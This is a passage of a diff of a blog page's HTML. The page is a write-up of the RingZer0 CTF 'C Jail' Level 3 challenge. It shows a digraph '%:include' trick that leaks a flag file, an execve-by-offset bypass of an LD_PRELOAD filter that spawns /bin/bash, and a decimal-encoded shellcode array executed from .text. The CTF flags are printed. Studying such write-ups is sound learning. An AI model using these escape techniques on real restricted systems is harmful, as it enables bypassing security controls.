+/tmp/<span style="color:#3677a9">41</span>d5ddc3-<span style="color:#3677a9">8</span>d6b-<span style="color:#3677a9">42</span>ce-a2cf-<span style="color:#3677a9">1026f</span>cfe463f/bin.c:<span style="color:#3677a9">13</span>:<span style="color:#3677a9">11</span>: warning: unused variable <span style="color:#a61717;background-color:#e3d2d2">‘</span>fp<span style="color:#a61717;background-color:#e3d2d2">’</span> [-Wunused-variable]
      FILE *fp;
            ^
 Executing your code.
-flag: FLAG-<span style=color:#3677a9>0416</span>ewrN2o058901Aqf4w9hsyH0dfqzd
-</code></pre></div><h1 id=level-3>Level 3</h1><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>RingZer0 Team Online CTF
+flag: FLAG-<span style="color:#3677a9">0416</span>ewrN2o058901Aqf4w9hsyH0dfqzd
+</code></pre></div><h1 id="level-3">Level 3</h1>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">RingZer0 Team Online CTF
 
 C Jail Level 3:
 Current user is uid=1002(level3) gid=1002(level3) groups=1002(level3)
@@ -195,16 +290,33 @@ You CANNOT use the &#34;asm,open,read,mmap,brk,sh,#,sys,\x&#34; keyword
 Your C code:
 
 </code></pre></div><p>I must admit that although this challenge wasn&rsquo;t that difficult it took me way to much time to find a reasonable solution. My first ideea
-was to write <code>shellcode</code> that would read <code>flag.txt</code> and dump its content. This is also the reason I wrote <a href=http://blog.dornea.nu/2016/08/23/testing-shellcodes/>&ldquo;Testing Shellcodes&rdquo;</a>. However, I&rsquo;ve noticed that <code>\x</code> (hex code) couldn&rsquo;t be used as a keyword. Instead of <em>giving up</em> my
-first idea I should have think of some way how to re-write those hex codes to sth different: <em>octal</em> values or <em>integer</em> values of <em>chars</em>. That way I would have had bypassed the <code>\x</code> restriction.</p><p>First I&rsquo;ll try to write down my thoughts which lead to the solution. Afterwards I&rsquo;ll show some other cool solutions I&rsquo;ve seen in the write-ups.</p><h2 id=my-solution>My solution</h2><p>After trying hard I&rsquo;ve decided to buy the hint:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.c data-lang=.c><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>alias for old system?</span><span style=color:#cd2828;font-weight:700>
+was to write <code>shellcode</code> that would read <code>flag.txt</code> and dump its content.  This is also the reason I wrote <a href="http://blog.dornea.nu/2016/08/23/testing-shellcodes/">&ldquo;Testing Shellcodes&rdquo;</a>. However, I&rsquo;ve noticed that <code>\x</code> (hex code) couldn&rsquo;t be used as a keyword. Instead of <em>giving up</em> my
+first idea I should have think of some way how to re-write those hex codes to sth different: <em>octal</em> values or <em>integer</em> values of <em>chars</em>. That way I would have had bypassed the <code>\x</code> restriction.</p>
+<p>First I&rsquo;ll try to write down my thoughts which lead to the solution. Afterwards I&rsquo;ll show some other cool solutions I&rsquo;ve seen in the write-ups.</p>
+<h2 id="my-solution">My solution</h2>
+<p>After trying hard I&rsquo;ve decided to buy the hint:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">alias for old system?</span><span style="color:#cd2828;font-weight:bold">
 </span></code></pre></div><p>Then I was looking for another <em>preprocessor</em> directives meant to <em>embed</em>/<em>include</em> code in other files. But I didn&rsquo;t find sth useful. Besides
-that all preprocessor directives start with &lsquo;#&rsquo; which was a bad keyword. However, this assumption was wrong.</p><p>Somebody told me then that I should look for an &ldquo;old function&rdquo; which could do the same. Functions, you say. All&rsquo;right! At (<a href=https://www.gnu.org/software/libc/manual/html_node/Function-Index.html)%5Bhttps://www.gnu.org/software/libc/manual/html_node/Function-Index.html%5D>https://www.gnu.org/software/libc/manual/html_node/Function-Index.html)[https://www.gnu.org/software/libc/manual/html_node/Function-Index.html]</a> you can find all
-<em>libc</em> functions available. But I had to do some filtering:</p><ul><li>since the <em>open</em> and <em>read</em> keywords weren&rsquo;t allowed, I wasn&rsquo;t able to create any <em>file streams</em> (FILE *) or <em>file descriptors</em> (int fd)<ul><li>that means that all functions taking a <code>FILE *</code> pointer or a file descriptor <code>int fd</code> weren&rsquo;t suitable</li></ul></li><li>the <code>exec*</code> family (execl, execlp, execle, execv, execvp, execvpe) was also not a good ideea since these functions were disabled by the <code>LD_PRELOAD</code> override</li><li><code>malloc</code> was also disabled by the override so no functions using malloc internally could be used</li></ul><p>Finally I was desperately searching for some functions but I couldn&rsquo;t find one. I think I was overthinking the solution way to much: I
+that all preprocessor directives start with &lsquo;#&rsquo; which was a bad keyword. However, this assumption was wrong.</p>
+<p>Somebody told me then that I should look for an &ldquo;old function&rdquo; which could do the same. Functions, you say. All&rsquo;right! At (<a href="https://www.gnu.org/software/libc/manual/html_node/Function-Index.html)%5Bhttps://www.gnu.org/software/libc/manual/html_node/Function-Index.html%5D">https://www.gnu.org/software/libc/manual/html_node/Function-Index.html)[https://www.gnu.org/software/libc/manual/html_node/Function-Index.html]</a> you can find all
+<em>libc</em> functions available. But I had to do some filtering:</p>
+<ul>
+<li>since the <em>open</em> and <em>read</em> keywords weren&rsquo;t allowed, I wasn&rsquo;t able to create any <em>file streams</em> (FILE *) or <em>file descriptors</em> (int fd)
+<ul>
+<li>that means that all functions taking a <code>FILE *</code> pointer or a file descriptor <code>int fd</code> weren&rsquo;t suitable</li>
+</ul>
+</li>
+<li>the <code>exec*</code> family (execl, execlp, execle, execv, execvp, execvpe) was also not a good ideea since these functions were disabled by the <code>LD_PRELOAD</code> override</li>
+<li><code>malloc</code> was also disabled by the override so no functions using malloc internally could be used</li>
+</ul>
+<p>Finally I was desperately searching for some functions but I couldn&rsquo;t find one. I think I was overthinking the solution way to much: I
 was hoping to find a <em>function</em> (in the context of C code) which would then <em>include</em> <code>flag.txt</code> and try to interpret its content as valid
 C code. Since the flag file contains no valid code, the compiler will then produce some error messages which hopefully will dump the flag
-inside <code>flag.txt</code>. Unfortunately after &ldquo;parsing&rdquo; the libc functions index site I couldn&rsquo;t find anything.</p><p>Finally, somebody (thx nsr @nullsecurity.net IRC channel) told that there might be a way to accomplish &ldquo;#include&rdquo; without using &ldquo;#&rdquo;. The hint
-I was after was called <a href=https://en.wikipedia.org/wiki/Digraphs_and_trigraphs>Digraphs/Trigraphs</a>. Especially for the C language the preprocessor
-is able to replace digraphs/trigraphs by their <a href=https://en.wikipedia.org/wiki/Digraphs_and_trigraphs#C>single-character equivalents before any other processing</a>. This way I was able to trigger the error message I was hoping for:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Your C code:
+inside <code>flag.txt</code>. Unfortunately after &ldquo;parsing&rdquo; the libc functions index site I couldn&rsquo;t find anything.</p>
+<p>Finally, somebody (thx nsr @nullsecurity.net IRC channel) told that there might be a way to accomplish &ldquo;#include&rdquo; without using &ldquo;#&rdquo;. The hint
+I was after was called <a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs">Digraphs/Trigraphs</a>. Especially for the C language the preprocessor
+is able to replace digraphs/trigraphs by their <a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs#C">single-character equivalents before any other processing</a>. This way I was able to trigger the error message I was hoping for:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Your C code:
 %:include &#34;/home/level3/flag.txt&#34;
 DONE
 
@@ -223,11 +335,16 @@ In file included from /tmp/1b9dd64e-70af-40cf-95b5-d4ef0593247c/bin.c:13:0:
  }
  ^
 Your code does not compile.
-</code></pre></div><p>There we go: <code>FLAG-BE79t326XS03122r5A4206tv395P64WB</code></p><h2 id=other-solutions>Other solutions</h2><h3 id=bypass-ld_preload>Bypass LD_PRELOAD</h3><p>As I&rsquo;ve noticed some functions (among these also <code>execve()</code>) were disabled due to the <code>LD_PRELOAD</code> override. Some <a href=https://ringzer0team.com/profile/2319>smart guy</a> managed it to find in memory the real libc functions and thus bypassing the <code>LD_PRELOAD</code> override. Using <a href=http://libcdb.com>libcdb.com</a> you can identify the exact version of the used libc version by finding out the addresses of some functions (in his case <code>puts</code> and <code>printf</code>):</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Compiling your code.
+</code></pre></div><p>There we go: <code>FLAG-BE79t326XS03122r5A4206tv395P64WB</code></p>
+<h2 id="other-solutions">Other solutions</h2>
+<h3 id="bypass-ld_preload">Bypass LD_PRELOAD</h3>
+<p>As I&rsquo;ve noticed some functions (among these also <code>execve()</code>) were disabled due to the <code>LD_PRELOAD</code> override. Some <a href="https://ringzer0team.com/profile/2319">smart guy</a> managed it to find in memory the real libc functions and thus bypassing the <code>LD_PRELOAD</code> override. Using <a href="http://libcdb.com">libcdb.com</a> you can identify the exact version of the used libc version by finding out the addresses of some functions (in his case <code>puts</code> and <code>printf</code>):</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Compiling your code.
 Executing your code.
 puts: 0x7ffe36166e30
 printf: 0x7ffe3614b400
-</code></pre></div><p>After finding the exact libc version, he/she downloaded the file and had a look at it:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ readelf -s libc-2.19_15.so | grep puts
+</code></pre></div><p>After finding the exact libc version, he/she downloaded the file and had a look at it:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ readelf -s libc-2.19_15.so | grep puts
    184: 000000000006fe30   399 FUNC    GLOBAL DEFAULT   12 _IO_puts@@GLIBC_2.2.5
    400: 000000000006fe30   399 FUNC    WEAK   DEFAULT   12 puts@@GLIBC_2.2.5      &lt;--- the one we have
    471: 00000000000fef10  1031 FUNC    GLOBAL DEFAULT   12 putspent@@GLIBC_2.2.5      
@@ -239,17 +356,118 @@ printf: 0x7ffe3614b400
 $ greadelf -s libc-2.19_15.so | grep execve
    987: 00000000000c1360   200 FUNC    GLOBAL DEFAULT   12 fexecve@@GLIBC_2.2.5
   1418: 00000000000c1330    34 FUNC    WEAK   DEFAULT   12 execve@@GLIBC_2.2.5    &lt;--- the one we want
-</code></pre></div><p>By calculating the offset between <code>puts</code> and <code>execve</code> he/she could then build following code:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.c data-lang=.c><span style=color:#6ab825;font-weight:700>int</span> (*real_execve)(<span style=color:#6ab825;font-weight:700>const</span> <span style=color:#6ab825;font-weight:700>char</span> *, <span style=color:#6ab825;font-weight:700>char</span> *<span style=color:#6ab825;font-weight:700>const</span> *, <span style=color:#6ab825;font-weight:700>char</span> * <span style=color:#6ab825;font-weight:700>const</span> *) = (<span style=color:#6ab825;font-weight:700>void</span>*)puts + &lt;OFFSET&gt;;
-<span style=color:#6ab825;font-weight:700>char</span> program[] = {<span style=color:#3677a9>47</span>, <span style=color:#3677a9>98</span>, <span style=color:#3677a9>105</span>, <span style=color:#3677a9>110</span>, <span style=color:#3677a9>47</span>, <span style=color:#3677a9>98</span>, <span style=color:#3677a9>97</span>, <span style=color:#3677a9>115</span>, <span style=color:#3677a9>104</span>, <span style=color:#3677a9>0</span>};
-real_execve(program, <span style=color:#3677a9>0</span>, <span style=color:#3677a9>0</span>);
-</code></pre></div><p>Clever!</p><h3 id=execute-shellcode>Execute shellcode</h3><p>Since I was initially trying to execute shellcode, I was very curios about any similar solutions. <a href=https://ringzer0team.com/profile/5732>killer2</a> had a very elegant solution:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.c data-lang=.c><span style=color:#999;font-style:italic>// Place the shellcode inside the .text section
-</span><span style=color:#999;font-style:italic></span><span style=color:#6ab825;font-weight:700>static</span> <span style=color:#6ab825;font-weight:700>const</span> <span style=color:#6ab825;font-weight:700>char</span> <span style=color:#447fcf>__attribute__</span>((section (<span style=color:#ed9d13>&#34;.text&#34;</span>))) code[] = { <span style=color:#3677a9>72</span>,<span style=color:#3677a9>129</span>,<span style=color:#3677a9>236</span>,<span style=color:#3677a9>255</span>,<span style=color:#3677a9>15</span>,<span style=color:#3677a9>0</span>,<span style=color:#3677a9>0</span>,<span style=color:#3677a9>72</span>,<span style=color:#3677a9>49</span>,<span style=color:#3677a9>255</span>,<span style=color:#3677a9>72</span>,<span style=color:#3677a9>141</span>,<span style=color:#3677a9>52</span>,<span style=color:#3677a9>36</span>,<span style=color:#3677a9>106</span>,<span style=color:#3677a9>50</span>,<span style=color:#3677a9>90</span>,<span style=color:#3677a9>72</span>,<span style=color:#3677a9>49</span>,<span style=color:#3677a9>192</span>,<span style=color:#3677a9>15</span>,<span style=color:#3677a9>5</span>,<span style=color:#3677a9>72</span>,<span style=color:#3677a9>135</span>,<span style=color:#3677a9>254</span>,<span style=color:#3677a9>72</span>,<span style=color:#3677a9>49</span>,<span style=color:#3677a9>246</span>,<span style=color:#3677a9>106</span>,<span style=color:#3677a9>2</span>,<span style=color:#3677a9>88</span>,<span style=color:#3677a9>15</span>,<span style=color:#3677a9>5</span>,<span style=color:#3677a9>72</span>,<span style=color:#3677a9>141</span>,<span style=color:#3677a9>52</span>,<span style=color:#3677a9>36</span>,<span style=color:#3677a9>106</span>,<span style=color:#3677a9>100</span>,<span style=color:#3677a9>90</span>,<span style=color:#3677a9>72</span>,<span style=color:#3677a9>151</span>,<span style=color:#3677a9>72</span>,<span style=color:#3677a9>49</span>,<span style=color:#3677a9>192</span>,<span style=color:#3677a9>15</span>,<span style=color:#3677a9>5</span>,<span style=color:#3677a9>106</span>,<span style=color:#3677a9>1</span>,<span style=color:#3677a9>95</span>,<span style=color:#3677a9>72</span>,<span style=color:#3677a9>137</span>,<span style=color:#3677a9>194</span>,<span style=color:#3677a9>106</span>,<span style=color:#3677a9>1</span>,<span style=color:#3677a9>88</span>,<span style=color:#3677a9>15</span>,<span style=color:#3677a9>5</span>,<span style=color:#3677a9>72</span>,<span style=color:#3677a9>129</span>,<span style=color:#3677a9>196</span>,<span style=color:#3677a9>255</span>,<span style=color:#3677a9>15</span>,<span style=color:#3677a9>0</span>,<span style=color:#3677a9>0</span>,<span style=color:#3677a9>195</span> };
+</code></pre></div><p>By calculating the offset between <code>puts</code> and <code>execve</code> he/she could then build following code:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#6ab825;font-weight:bold">int</span> (*real_execve)(<span style="color:#6ab825;font-weight:bold">const</span> <span style="color:#6ab825;font-weight:bold">char</span> *, <span style="color:#6ab825;font-weight:bold">char</span> *<span style="color:#6ab825;font-weight:bold">const</span> *, <span style="color:#6ab825;font-weight:bold">char</span> * <span style="color:#6ab825;font-weight:bold">const</span> *) = (<span style="color:#6ab825;font-weight:bold">void</span>*)puts + &lt;OFFSET&gt;;
+<span style="color:#6ab825;font-weight:bold">char</span> program[] = {<span style="color:#3677a9">47</span>, <span style="color:#3677a9">98</span>, <span style="color:#3677a9">105</span>, <span style="color:#3677a9">110</span>, <span style="color:#3677a9">47</span>, <span style="color:#3677a9">98</span>, <span style="color:#3677a9">97</span>, <span style="color:#3677a9">115</span>, <span style="color:#3677a9">104</span>, <span style="color:#3677a9">0</span>};
+real_execve(program, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>);
+</code></pre></div><p>Clever!</p>
+<h3 id="execute-shellcode">Execute shellcode</h3>
+<p>Since I was initially trying to execute shellcode, I was very curios about any similar solutions. <a href="https://ringzer0team.com/profile/5732">killer2</a> had a very elegant solution:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#999;font-style:italic">// Place the shellcode inside the .text section
+</span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">static</span> <span style="color:#6ab825;font-weight:bold">const</span> <span style="color:#6ab825;font-weight:bold">char</span> <span style="color:#447fcf">__attribute__</span>((section (<span style="color:#ed9d13">&#34;.text&#34;</span>))) code[] = { <span style="color:#3677a9">72</span>,<span style="color:#3677a9">129</span>,<span style="color:#3677a9">236</span>,<span style="color:#3677a9">255</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">0</span>,<span style="color:#3677a9">0</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">49</span>,<span style="color:#3677a9">255</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">141</span>,<span style="color:#3677a9">52</span>,<span style="color:#3677a9">36</span>,<span style="color:#3677a9">106</span>,<span style="color:#3677a9">50</span>,<span style="color:#3677a9">90</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">49</span>,<span style="color:#3677a9">192</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">5</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">135</span>,<span style="color:#3677a9">254</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">49</span>,<span style="color:#3677a9">246</span>,<span style="color:#3677a9">106</span>,<span style="color:#3677a9">2</span>,<span style="color:#3677a9">88</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">5</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">141</span>,<span style="color:#3677a9">52</span>,<span style="color:#3677a9">36</span>,<span style="color:#3677a9">106</span>,<span style="color:#3677a9">100</span>,<span style="color:#3677a9">90</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">151</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">49</span>,<span style="color:#3677a9">192</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">5</span>,<span style="color:#3677a9">106</span>,<span style="color:#3677a9">1</span>,<span style="color:#3677a9">95</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">137</span>,<span style="color:#3677a9">194</span>,<span style="color:#3677a9">106</span>,<span style="color:#3677a9">1</span>,<span style="color:#3677a9">88</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">5</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">129</span>,<span style="color:#3677a9">196</span>,<span style="color:#3677a9">255</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">0</span>,<span style="color:#3677a9">0</span>,<span style="color:#3677a9">195</span> };
 
-<span style=color:#999;font-style:italic>// Run the shellcode
-</span><span style=color:#999;font-style:italic></span>(*(<span style=color:#6ab825;font-weight:700>void</span>(*)())code)();
-</code></pre></div><p>Nice!</p><blockquote><p>You can find <a href=https://gcc.gnu.org/onlinedocs/gcc-4.0.0/gcc/Function-Attributes.html>here</a> more information about function attributes.</p></blockquote></div></main><div class="tl fixed list-pages lh-copy" id=contents-list></div><div class="pagination tc tr-l db fixed-l bottom-2-l right-2-l mb3 mb0-l"><a id=scroll-to-top class="f6 o-0 link br2 ph2 pv1 mb1 bg-main-color pointer" onclick=topFunction() style="color:#fff;visibility:hidden;display:none;transition:opacity .5s,visibility .5s" title="back to top">back to top</a><br><p class="mb0 mt2"><a href=http://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-bash/>prev post</a>
-<a href=http://blog.dornea.nu/2016/10/21/hack.lu-conference-2016/>next post</a></p></div><footer class="content-width mt0 mt5-l mb4 f6 center ph3 gray tc tl-l"><hr class="dn db-l ml0-l gray w3"><br>Powered by <a href=https://gohugo.io/ target=_blank class="link gray dim">Hugo</a>, based on the <a href=https://github.com/lingxz/er target=_blank class="link gray dim">Er</a> theme.<br></footer><script src=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js></script><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css><style>.is-active-link::before{background-color:var(--secondary-color)}</style><script type=text/javascript>var prevScrollpos=window.pageYOffset;window.onscroll=function(){var currentScrollPos=window.pageYOffset;if(document.getElementById("tag-cloud")!==null){if(prevScrollpos>currentScrollPos){document.getElementById("tag-cloud").style.visibility="visible";document.getElementById("tag-cloud").style.opacity="1";}else{document.getElementById("tag-cloud").style.visibility="hidden";document.getElementById("tag-cloud").style.opacity="0";}}
-if(document.body.scrollTop>1000||document.documentElement.scrollTop>1000){document.getElementById("scroll-to-top").style.display="inline";document.getElementById("scroll-to-top").style.visibility="visible";document.getElementById("scroll-to-top").style.opacity="1";}else{document.getElementById("scroll-to-top").style.visibility="hidden";document.getElementById("scroll-to-top").style.opacity="0";}
-prevScrollpos=currentScrollPos;}
-function topFunction(){document.body.scrollTop=0;document.documentElement.scrollTop=0;}
-if(document.getElementById("contents-list")!==null&&document.getElementsByClassName("post-content").length!==0){tocbot.init({tocSelector:'#contents-list',contentSelector:'.post-content',headingSelector:'h1, h2, h3',});}</script></body></html>
+<span style="color:#999;font-style:italic">// Run the shellcode
+</span><span style="color:#999;font-style:italic"></span>(*(<span style="color:#6ab825;font-weight:bold">void</span>(*)())code)();
+</code></pre></div><p>Nice!</p>
+<blockquote>
+<p>You can find <a href="https://gcc.gnu.org/onlinedocs/gcc-4.0.0/gcc/Function-Attributes.html">here</a> more information about function attributes.</p>
+</blockquote>
+</div>
+</main>
+ 
+
+
+
+
+
+
+<div class="tl fixed list-pages lh-copy" id="contents-list"></div>
+
+
+
+<div class="pagination tc tr-l db fixed-l bottom-2-l right-2-l mb3 mb0-l">
+  
+<a id="scroll-to-top" class="f6 o-0 link br2 ph2 pv1 mb1 bg-main-color pointer" onclick="topFunction()" style="color: #fff; visibility: hidden; display: none; transition: opacity .5s, visibility .5s;" title="back to top">back to top</a>
+<br>
+  <p class="mb0 mt2">
+  <a href="http://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-bash/">prev post</a>
+  <a href="http://blog.dornea.nu/2016/10/21/hack.lu-conference-2016/">next post</a>
+  </p>
+</div>
+
+  <footer class="content-width mt0 mt5-l mb4 f6 center ph3 gray tc tl-l">
+  <hr class="dn db-l ml0-l gray w3"><br>
+  Powered by <a href="https://gohugo.io/" target="_blank" class="link gray dim">Hugo</a>, based on the <a href="https://github.com/lingxz/er" target="_blank" class="link gray dim">Er</a> theme. <br>
+  
+</footer>
+  
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<style>.is-active-link::before { background-color: var(--secondary-color); }</style>
+
+
+
+
+<script type="text/javascript">
+var prevScrollpos = window.pageYOffset;
+window.onscroll = function() {
+  var currentScrollPos = window.pageYOffset;
+
+  
+  if (document.getElementById("tag-cloud") !== null) { 
+    if (prevScrollpos > currentScrollPos) { 
+      document.getElementById("tag-cloud").style.visibility = "visible";
+      document.getElementById("tag-cloud").style.opacity = "1";
+    } else {
+      document.getElementById("tag-cloud").style.visibility = "hidden";
+      document.getElementById("tag-cloud").style.opacity = "0";
+    }
+  }
+  
+
+  
+  if (document.body.scrollTop > 1000 || document.documentElement.scrollTop > 1000) {
+      document.getElementById("scroll-to-top").style.display = "inline";
+      document.getElementById("scroll-to-top").style.visibility = "visible";
+      document.getElementById("scroll-to-top").style.opacity = "1";
+  } else {
+      document.getElementById("scroll-to-top").style.visibility = "hidden";
+      document.getElementById("scroll-to-top").style.opacity = "0";
+  }
+  
+  prevScrollpos = currentScrollPos;
+}
+
+
+function topFunction() {
+  document.body.scrollTop = 0; 
+  document.documentElement.scrollTop = 0; 
+}
+
+
+
+
+
+
+if (document.getElementById("contents-list") !== null && document.getElementsByClassName("post-content").length !== 0) { 
+  tocbot.init({
+    
+    tocSelector: '#contents-list',
+    
+    contentSelector: '.post-content',
+    
+    headingSelector: 'h1, h2, h3',
+  });
+}
+
+
+</script>
+
+
+
+
+</body>
+</html>
